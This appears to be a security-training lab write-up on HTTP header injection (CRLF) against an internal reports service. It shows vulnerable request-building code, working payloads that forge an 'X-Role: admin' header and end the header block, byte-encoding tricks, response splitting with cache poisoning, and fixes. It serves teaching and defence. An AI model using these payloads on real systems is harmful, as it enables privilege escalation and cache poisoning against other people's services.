# Lab 31 — Reports

## The bug

```python
raw = (f"GET /render HTTP/1.1\r\n"
       f"Host: reports.internal\r\n"
       f"X-Report-Name: {name}\r\n"      # a value with a newline in it
       f"X-Role: guest\r\n"
       f"Connection: close\r\n\r\n")
```

HTTP is a line protocol. A header value that may contain `\r\n` is not a value
— it is the rest of the message. The front end believes it is asking as `guest`;
the attacker decides what the request actually says.

## Reading the reflection

This app echoes what it sent. That is a gift, and it is also a habit worth
cultivating on real targets: **look for anywhere an application shows you its
own outbound request** — debug endpoints, error messages, webhook test results,
"preview" and "validate" features.

```bash
h5i websec replay req_0 --session lab31 --create \
    --set method=POST --set path=/api/report \
    --set header.Content-Type=application/json \
    --set "json.name=probe"$'\r\n'"X-Injected: yes"
h5i websec show res_1 --session lab31 --raw
```

```
"sent": "GET /render HTTP/1.1\r\nHost: ...\r\nX-Report-Name: probe\r\nX-Injected: yes\r\nX-Role: guest\r\n..."
```

There is a header the front end never wrote.

## Winning the duplicate

Injecting `X-Role: admin` *before* the app's own `X-Role: guest` only works if
the receiver keeps the **first** duplicate. Some keep the last. Do not guess —
end the header block instead:

```
json.name = "quarterly\r\nX-Role: admin\r\n\r\n"
```

```
GET /render HTTP/1.1
Host: reports.internal
X-Report-Name: quarterly
X-Role: admin
                          <- blank line: the message ends here
X-Role: guest             <- now body bytes, read by nobody
Connection: close
```

Terminating the block beats winning a precedence rule, and it works against both
kinds of parser. Once you can do that you can also append a **whole second
request**, which is Lab 30 arriving by another road.

## Getting real CR and LF onto the wire

The payload must arrive as the bytes `0d 0a`, not the four characters `%0d%0a`.
Where you inject decides how hard that is:

| Injection point | How to carry the bytes |
| --- | --- |
| JSON body field | `$'\r\n'` in the shell — JSON escapes it, the server's parser restores it. Easiest, and this lab. |
| query parameter | works only if the app decodes once more than its framework does; otherwise `--raw-target` (Lab 27) |
| a header you control | usually rejected by the sender; use `--raw-request` (Lab 30) |
| `--set body.raw=` | exactly the bytes you write |

Also try a lone `\n` — many parsers accept it where `\r\n` is filtered — and
the JSON-escaped forms where an intermediate layer normalises.

## The response-side twin

The same bug pointing outwards is **response splitting**: user input reflected
into a *response* header (`Location:`, `Set-Cookie:`) with `\r\n` intact lets
an attacker append headers and an entire second response. Combined with a cache
(Lab 33), one request poisons the page every later visitor receives.

Probe it the same way, and read the raw response:

```bash
h5i websec replay req_N --session lab31 --set 'query.lang=en%0d%0aX-Injected:%20yes'
h5i websec show res_M --session lab31 --raw | head
```

## The fix

* Never interpolate untrusted values into a raw protocol message. Use an HTTP
  client and pass headers as a structured mapping — a good one refuses a value
  containing CR or LF.
* Validate the value against what it is: a report name is
  `^[A-Za-z0-9_-]{1,64}$`, not "any string".
* Do not carry authorisation in a header that an upstream also composes.
  Terminate authentication at the edge and pass a signed token the internal
  service verifies, so a forged header proves nothing.

## h5i technique

`$'\r\n'` inside a `--set json....` value; `websec show req_N --raw` and
`res_N --raw` to read the literal bytes on both halves of the exchange.
